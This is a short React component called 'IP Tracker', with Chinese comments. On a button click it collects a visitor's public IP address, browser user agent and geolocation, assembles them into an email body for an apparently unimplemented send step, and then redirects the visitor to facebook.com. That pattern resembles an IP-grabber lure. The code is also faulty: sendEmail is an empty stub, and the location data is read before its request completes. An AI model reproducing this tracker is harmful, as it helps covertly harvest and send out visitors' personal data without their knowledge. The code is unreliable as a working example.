import React, { useEffect, useState } from 'react';

function App() {
  const [ipAddress, setIpAddress] = useState('');
  const [deviceInfo, setDeviceInfo] = useState('');
  const [locationData, setLocationData] = useState('');

  useEffect(() => {
    // 获取访问者的 IP 地址
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        setIpAddress(data.ip);
      });

    // 获取设备信息
    setDeviceInfo(navigator.userAgent);
  }, []);

  const handleSearch = () => {
    // 查询 IP 地址的位置数据
    fetch(`https://ipapi.co/${ipAddress}/json/`)
      .then(response => response.json())
      .then(data => {
        setLocationData(JSON.stringify(data, null, 2));
      });

    // 发送相关信息的邮件
    const emailContent = `
      IP Address: ${ipAddress}
      Device Info: ${deviceInfo}
      Location Data: ${locationData}
    `;

    // 这里你需要编写发送邮件的逻辑，可以使用相应的邮件发送库或服务
    sendEmail(emailContent);

    // 将网页重定向到特定页面
    window.location.href = 'https://www.facebook.com/';
  };

  function sendEmail(){

  }

  return (
    <div>
      <h1>IP Tracker</h1>
      <p>IP Address: {ipAddress}</p>
      <p>Device Info: {deviceInfo}</p>
      <button onClick={handleSearch}>Search IP Location</button>
      <pre>{locationData}</pre>
    </div>
  );
}

export default App;
